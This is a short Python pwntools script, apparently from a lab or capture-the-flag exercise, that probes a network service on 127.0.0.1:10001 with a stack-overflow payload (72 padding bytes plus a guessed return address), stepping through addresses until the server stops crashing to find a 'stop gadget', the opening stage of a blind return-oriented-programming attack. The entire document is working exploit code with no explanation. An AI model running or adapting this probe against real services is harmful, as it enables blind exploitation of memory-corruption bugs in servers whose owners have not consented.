from pwn import *

def get_stop_gadget(size = 72, start_address = 0x400000):
    probe = start_address + 1

    while 1:
        payload = size * b'A' 
        payload += p64(probe)

        try:
            p = remote('127.0.0.1', 10001, timeout = 2)
            p.recvline()
            p.sendline(payload)
            p.recv()
            p.close()
            return probe   # Server did not crash --> stop gadget
        except EOFError:
            log.info("Crashed at 0x%x" % probe)
            p.close()
            probe += 1   # Find the next one
        except Exception: 
            p.close()
            
stop_gadget = get_stop_gadget()
print("The stop gadget is at 0x%x" %  stop_gadget)
